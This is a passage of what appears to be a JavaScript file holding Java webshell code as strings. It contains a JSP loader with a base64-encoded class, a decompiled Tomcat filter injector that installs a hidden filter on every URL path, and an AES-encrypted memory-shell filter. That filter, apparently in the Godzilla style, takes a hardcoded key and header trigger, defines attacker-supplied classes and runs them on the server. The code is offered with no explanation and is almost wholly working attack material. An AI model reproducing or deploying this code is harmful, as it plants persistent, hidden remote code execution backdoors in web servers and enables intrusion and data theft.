AnkAAwAMAAAA0CrBADCZAAoqwAAwpwAHKrYATDoEAToFGQQ6BhkFxwBqGQbGAGUsxwBJGQa2AIQ6BxkHOggZCL42CQM2ChUKFQmiACwZCBUKMjoLGQu2AIgrtgCMmQATGQu2AJC+mgAKGQs6BacACYQKAaf/06cADBkGKyy2AJQ6Baf/ozoHGQa2AHE6Bqf/lxkFxwAMuwCXWSu3AJm/GQUEtgCaKsEAMJkAGhkFAS22AECwOge7AJ1ZGQe2AJ+3AKK/GQUqLbYAQLA6B7sAnVkZB7YAn7cAor8AAwAlAHgAewCXAKIAqQCqAJsAuQDAAMEAmwAEAVQAAABlAA4OQwcAMP4ACAcAMAcAQQcAMP8AIAALBwACBwA3BwGCBwGDBwAwBwBBBwAwBwGEBwGEAQEAACn/AAUABwcAAgcANwcBggcBgwcAMAcAQQcAMAAAAghCBwCXCw1UBwCbDkcHAJsBSgAAAG4AGwAAAGQAFABlABcAZwAbAGgAJQBqACkAbAAwAG0ASgBuAF8AbwBjAHAAZgBtAGwAcwBvAHQAeAB4AHsAdgB9AHcAhAB4AIcAegCMAHsAlQB9AJsAfgCiAIAAqgCBAKwAggC5AIYAwQCHAMMAiAFLAAAAegAMAEoAHAF0AXUACwAwADwBdgF3AAcAfQAHAXgBeQAHAKwADQF4AXoABwDDAA0BeAF6AAcAAADQAWsBTQAAAAAA0AFxAVoAAQAAANABewF8AAIAAADQAX0BfgADABQAvAFvAQQABAAXALkBfwF1AAUAGwC1AYABBAAGAVIAAAAgAAMAAADQAXsBgQACABQAvAFvAVsABAAbALUBgAFbAAYBXAAAAAgAAwCXAXIAmwGFAAAAAgGGAAEACwAMAAMBSQAAAu8ABQAOAAABfLsAo1m3AKVMEqYSqLgBtMAArU0BTiw6BBkEvjYFAzYGFQYVBaIBRxkEFQYyOgcZB7YArxKwtgCymQC3LccAsyoqKhkHEra2AbUSu7YBtRK9tgG1wAC/OggZCLYAwbkAxQEAOgkZCbkAEwEAmQCBGQm5ABkBADoKKhkIGQq2AMgSvbYBtcAAvzoLGQu2AMG5AMUBADoMGQy5ABMBAJkATRkMuQAZAQA6DRkLGQ22AMhOLcYAGi22AEy2AMkSyrYAspkACystuQDMAgBXLcYAGi22AEy2AMkSz7YAspkACystuQDMAgBXp/+vp/97pwB5GQe2ANHGAHEZB7YA0bYATLYA1RLYtgCymgAWGQe2ANG2AEy2ANUS2rYAspkASyoqGQe2ANES3LYBtRLetgG1Ti3GABottgBMtgDJEsq2ALKZAAsrLbkAzAIAVy3GABottgBMtgDJEs+2ALKZAAsrLbkAzAIAV4QGAaf+uKcADzoEuwCdWRkEtwDgvyuwAAEAFQFrAW4AJQAEAVQAAABPAA7/ACAABwcBqAcADgcArQcAAgcArQEBAAD+AEMHAKYHAL8HABT+ADAHAAIHAL8HABT8ADUHAAL6ABr4AAL5AAICLSz6ABr4AAVCBwAlCwFKAAAAcgAcAAAAjgAIAI8AEwCQABUAkgAuAJQAPwCVAFgAmAB3AJkAiQCcAKgAnQCwAJ4AwwCfAMsAogDeAKMA5gClAOkApgDsAKcA7wCpAR0AqgEvAKsBQgCsAUoArgFdAK8BZQCSAWsAtQFuALMBcAC0AXoAtgFLAAAAZgAKAKgAPgGHAU0ADQCJAGAAvgGIAAsAdwByAYkBTQAKAFgAlAGKAYgACAAuATcBiwGMAAcBcAAKAXgBWAAEAAABfAFQAawAAAAIAXQBTgFPAAEAEwFpAY0ArgACABUBZwDfAU0AAwFSAAAAIAADAIkAYAC+AY4ACwBYAJQBigGOAAgACAF0AU4BUwABAVwAAAAIAAMAmwCXAXIBhQAAAAIBjwACAB8AIAABAUkAAAGSAAYACAAAAIkBTbgA47YA0U4txwALK7YATLYA504tKrYBtrYA7U2nAGk6BCq2Abe4Abi4Abk6BRLuEv0GvQAwWQMSRlNZBLIA/1NZBbIA/1O2AJQ6BhkGBLYAmhkGLQa9AAJZAxkFU1kEA7gBBVNZBRkFvrgBBVO2AEDAADA6BxkHtgA9TacACjoFGQW2AQsssAACABUAHgAhACUAIwB9AIABCQAEAVQAAAArAAT9ABUHAAIHAO5LBwAl/wBeAAUHAagHAAIHAAIHAO4HACUAAQcBCfoABgFKAAAAQgAQAAAAugACALsACQC8AA0AvQAVAMAAHgDLACEAwQAjAMMALwDEAE0AxQBTAMYAdwDHAH0AygCAAMgAggDJAIcAzAFLAAAAXAAJAC8ATgGQAEcABQBNADAA/gF1AAYAdwAGAW8BBAAHAIIABQGRAZIABQAjAGQBeAFYAAQAAACJAVABrAAAAAAAiQDfAU0AAQACAIcBTAFNAAIACQCAAZMBlAADAVIAAAAMAAEAdwAGAW8BWwAHAAEAIwAkAAIBSQAABDAABwAKAAAB3yq2AbpOKrYBtjoEKxMBEQS9ADBZAxI3UwS9AAJZAxkEU7gBs8YABLGnAAU6BxMBE7gAL7YAPToFEwEVuAAvtgA9OganADo6BxMBF7gAL7YAPToFEwEZuAAvtgA9OganAB86CBMBFwQtuAEbtgA9OgUTARkELbgBG7YAPToGGQUTAR4EvQAwWQMSN1MEvQACWQMZBFO4AbNXGQUTASAEvQAwWQMSN1MEvQACWQMZBFO4AbNXKxMBIgS9ADBZAxkFtgBMUwS9AAJZAxkFU7gBs1cZBhMBHgS9ADBZAxI3UwS9AAJZAxkEU7gBs1cZBhMBJAS9ADBZAxI3UwS9AAJZAxMBJlO4AbNXGQYTASgEvQAwWQMSN1MEvQACWQMqtgG7U7gBs1cTAS24AC+2AS86B6cALzoIGQYTATMEvQAwWQMSN1MEvQACWQMqtgG7U7gBs1cTAS0ELbgBG7YBLzoHKxMBNQS9ADBZAxkGtgBMUwS9AAJZAxkGU7gBs1enACI6CCsTATcEvQAwWQMZBrYATFMEvQACWQMZBlO4AbNXGQcDMgS2ATkZBwMyBb0AAlkDK1NZBBkFU7YBPDoIKisTAT+2AbXAAUE6CRkJGQQZCLkBQwMAV6cACjoHGQe2AUexAAYACwAnACsAJQAtAEMARgAlAEgAXgBhACUBBwEvATIAJQFeAXsBfgAlAH0B1AHXACUABAFUAAAAfwAM/QAoBwDuBwA3QgcAJQFYBwAl/wAaAAgHAagHAAIHAAIHAO4HADcAAAcAJQABBwAl/wAbAAcHAagHAAIHAAIHAO4HADcHAAIHAAIAAPcAtAcAJfwAKwcBn18HACUe/wA5AAcHAagHAAIHAAIHAO4HADcHAAIHAAIAAQcAJQYBSgAAAJ4AJwAAANEABQDSAAsA2AAnANkAKADcACsA2wAtAOAAOADhAEMA7ABGAOIASADlAFMA5gBeAOsAYQDnAGMA6QBwAOoAfQDuAJgA7wCzAPAA0ADxAOsA8gEHAPUBJAD2AS8A+wEyAPcBNAD5AVEA+gFeAP4BewEBAX4A/wGAAQABnQEDAaUBBAG7AQUByAEGAdQBCQHXAQcB2QEIAd4BCgFLAAAAygAUADgADgGVAU0ABQBDAAMBlgFNAAYAUwAOAZUBTQAFAF4AAwGWAU0ABgBjABoBeAFYAAgASAA1AZcBWAAHAS8AAwGYAZkABwE0ACoBeAFYAAgBgAAdAXgBWAAIAV4AdgGYAZkABwG7ABkBmgFNAAgByAAMAUABmwAJAdkABQF4AVgABwAAAd8BUAGsAAAAAAHfAN8BTQABAAAB3wFMAU0AAgAFAdoBnAGUAAMACwHUAZ0BWgAEAHABbwGVAU0ABQB9AWIBlgFNAAYBUgAAABYAAgEvAAMBmAGeAAcBXgB2AZgBngAHAVwAAAAMAAUBcgCXAJsBoAGiAAEBEADUAAIBSQAAAMYAAgAHAAAAQRKmEqi4AbTAAK1MAU0rTi2+NgQDNgUVBRUEogAlLRUFMjoGGQa2AK8SsLYAspkADBkGtgDRTacACYQFAaf/2iywAAAAAwFUAAAAGwAD/wAWAAYHAagHAK0HAO4HAK0BAQAAIvgABQFKAAAAIgAIAAABDQALAQ4ADQEPACMBEQAwARIANgETADkBDwA/ARYBSwAAACoABAAjABYBiwGMAAYAAABBAVABrAAAAAsANgGNAK4AAQANADQBnAGUAAIBXAAAAAgAAwCXAXIAmwAIAaQABgABAUkAAAA3AAIAAAAAABGnAA0AuwGoWbcBvFexAKf/9QAAAAIBVAAAAAQAAgMJAUoAAAAKAAIABAAZAAwAGgABAaUAAAACAaY=";
    ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
    try {
        classLoader.loadClass(className).newInstance();
    } catch (Exception e) {
        try {
            java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            byte[] bytecode = decodeBase64(base64Str);
            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, bytecode, 0, bytecode.length);
            clazz.newInstance();
        } catch (Exception ignored) {
        }
    }
%>`;

const injectorClass = `//
// (powered by FernFlower decompiler)
//

package org.apache.lEfaI;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPInputStream;

public class SignatureUtils {
    public SignatureUtils() {
        try {
            for(Object context : this.getContext()) {
                Object filter = this.getFilter(context);
                this.addFilter(context, filter);
            }
        } catch (Exception var5) {
        }

    }

    public String getUrlPattern() {
        return "/*";
    }

    public String getClassName() {
        return "org.apache.NpAUp.ErrorHandler";
    }

    public String getBase64String() {
        return "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";
    }

    static byte[] decodeBase64(String base64Str) throws Exception {
        try {
            Class<?> decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception var4) {
            Class<?> decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke((Object)null);
            return (byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream gzipInputStream = new GZIPInputStream(in);
        byte[] buffer = new byte[256];

        int n;
        while((n = gzipInputStream.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }

        return out.toByteArray();
    }

    public Object getFieldValue(Object obj, String name) throws Exception {
        Field field = null;

        for(Class<?> clazz = obj.getClass(); clazz != Object.class; clazz = clazz.getSuperclass()) {
            try {
                field = clazz.getDeclaredField(name);
                break;
            }
        }

        if (field == null) {
            throw new NoSuchFieldException(name);
        } else {
            field.setAccessible(true);
            return field.get(obj);
        }
    }

    public static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class<?> clazz = obj instanceof Class ? (Class)obj : obj.getClass();
        Method method = null;
        Class<?> tempClass = clazz;

        while(method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    Method[] methods = tempClass.getDeclaredMethods();

                    for(Method value : methods) {
                        if (value.getName().equals(methodName) && value.getParameterTypes().length == 0) {
                            method = value;
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException var14) {
                tempClass = tempClass.getSuperclass();
            }
        }

        if (method == null) {
            throw new NoSuchMethodException(methodName);
        } else {
            method.setAccessible(true);
            if (obj instanceof Class) {
                try {
                    return method.invoke((Object)null, param);
                } catch (IllegalAccessException e) {
                    throw new RuntimeException(e.getMessage());
                }
            } else {
                try {
                    return method.invoke(obj, param);
                } catch (IllegalAccessException e) {
                    throw new RuntimeException(e.getMessage());
                }
            }
        }
    }

    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        List<Object> contexts = new ArrayList();
        Thread[] threads = (Thread[])invokeMethod(Thread.class, "getThreads");
        Object context = null;

        try {
            for(Thread thread : threads) {
                if (thread.getName().contains("ContainerBackgroundProcessor") && context == null) {
                    HashMap<?, ?> childrenMap = (HashMap)this.getFieldValue(this.getFieldValue(this.getFieldValue(thread, "target"), "this$0"), "children");

                    for(Object key : childrenMap.keySet()) {
                        HashMap<?, ?> children = (HashMap)this.getFieldValue(childrenMap.get(key), "children");

                        for(Object key1 : children.keySet()) {
                            context = children.get(key1);
                            if (context != null && context.getClass().getName().contains("StandardContext")) {
                                contexts.add(context);
                            }

                            if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                                contexts.add(context);
                            }
                        }
                    }
                } else if (thread.getContextClassLoader() != null && (thread.getContextClassLoader().getClass().toString().contains("ParallelWebappClassLoader") || thread.getContextClassLoader().getClass().toString().contains("TomcatEmbeddedWebappClassLoader"))) {
                    context = this.getFieldValue(this.getFieldValue(thread.getContextClassLoader(), "resources"), "context");
                    if (context != null && context.getClass().getName().contains("StandardContext")) {
                        contexts.add(context);
                    }

                    if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                        contexts.add(context);
                    }
                }
            }

            return contexts;
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    private Object getFilter(Object context) {
        Object filter = null;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }

        try {
            filter = classLoader.loadClass(this.getClassName());
        } catch (Exception var9) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(this.getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                defineClass.setAccessible(true);
                Class<?> clazz = (Class)defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                filter = clazz.newInstance();
            } catch (Throwable e1) {
                e1.printStackTrace();
            }
        }

        return filter;
    }

    public void addFilter(Object context, Object filter) throws InvocationTargetException, NoSuchMethodException, IllegalAccessException, ClassNotFoundException, InstantiationException {
        ClassLoader catalinaLoader = this.getCatalinaLoader();
        String filterClassName = this.getClassName();

        try {
            if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{filterClassName}) != null) {
                return;
            }
        } catch (Exception var15) {
        }

        Object filterDef;
        Object filterMap;
        try {
            filterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
            filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap").newInstance();
        } catch (Exception var14) {
            try {
                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
                filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
            } catch (Exception var13) {
                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef", true, catalinaLoader).newInstance();
                filterMap = Class.forName("org.apache.catalina.deploy.FilterMap", true, catalinaLoader).newInstance();
            }
        }

        try {
            invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterClassName});
            invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{filterClassName});
            invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
            invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterClassName});
            invokeMethod(filterMap, "setDispatcher", new Class[]{String.class}, new Object[]{"REQUEST"});

            Constructor<?>[] constructors;
            try {
                invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{this.getUrlPattern()});
                constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
            } catch (Exception var11) {
                invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{this.getUrlPattern()});
                constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig", true, catalinaLoader).getDeclaredConstructors();
            }

            try {
                invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
            } catch (Exception var10) {
                invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
            }

            constructors[0].setAccessible(true);
            Object filterConfig = constructors[0].newInstance(context, filterDef);
            Map filterConfigs = (Map)this.getFieldValue(context, "filterConfigs");
            filterConfigs.put(filterClassName, filterConfig);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public ClassLoader getCatalinaLoader() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Thread[] threads = (Thread[])invokeMethod(Thread.class, "getThreads");
        ClassLoader catalinaLoader = null;

        for(Thread thread : threads) {
            if (thread.getName().contains("ContainerBackgroundProcessor")) {
                catalinaLoader = thread.getContextClassLoader();
                break;
            }
        }

        return catalinaLoader;
    }

    static {
        new SignatureUtils();
    }
}
`;

const shellClass = `//
// (powered by FernFlower decompiler)
//

package org.apache.NpAUp;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

public class ErrorHandler extends ClassLoader implements Filter {
    public String key = "3c6e0b8a9c15224a";
    public String pass = "pass";
    public String md5 = "11CD6A87589841636C37AC826A2A04BC";
    public String headerName = "User-Agent";
    public String headerValue = "test123";

    public ErrorHandler() {
    }

    public ErrorHandler(ClassLoader var1) {
        super(var1);
    }

    public Class<?> Q(byte[] cb) {
        return super.defineClass(cb, 0, cb.length);
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(this.key.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception var41) {
            return null;
        }
    }

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain chain) throws ServletException, IOException {
        HttpServletRequest request = (HttpServletRequest)servletRequest;
        HttpServletResponse response = (HttpServletResponse)servletResponse;

        try {
            if (request.getHeader(this.headerName) != null && request.getHeader(this.headerName).contains(this.headerValue)) {
                HttpSession session = request.getSession();
                byte[] data = base64Decode(request.getParameter(this.pass));
                data = this.x(data, false);
                if (session.getAttribute("payload") == null) {
                    session.setAttribute("payload", (new ErrorHandler(this.getClass().getClassLoader())).Q(data));
                } else {
                    request.setAttribute("parameters", data);
                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();

                    Object f;
                    try {
                        f = ((Class)session.getAttribute("payload")).newInstance();
                    } catch (IllegalAccessException | InstantiationException e) {
                        throw new RuntimeException(e);
                    }

                    f.equals(arrOut);
                    f.equals(request);
                    response.getWriter().write(this.md5.substring(0, 16));
                    f.toString();
                    response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
                    response.getWriter().write(this.md5.substring(16));
                }
            } else {
                chain.doFilter(servletRequest, servletResponse);
            }
        } catch (Exception var12) {
            chain.doFilter(servletRequest, servletResponse);
        }

    }

    public void init(FilterConfig filterConfig) throws ServletException {
    }

    public void destroy() {
    }

    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;

        try {
            Class<?> base64 = Class.forName("java.util.Base64");
            Object encoder = base64.getMethod("getEncoder", (Class[])null).invoke(base64, (Object[])null);
            value = (String)encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var61) {
            try {
                Class<?> base64 = Class.forName("sun.misc.BASE64Encoder");
                Object encoder = base64.newInstance();
                value = (String)encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
            } catch (Exception var5) {
            }
        }

        return value;
    }

    public static byte[] base64Decode(String bs) {
        byte[] value = null;

        try {
            Class<?> base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[])null).invoke(base64, (Object[])null);
            value = (byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var61) {
            try {
                Class<?> base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[])decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
            } catch (Exception var5) {
            }
        }

        return value;
    }
}
`;
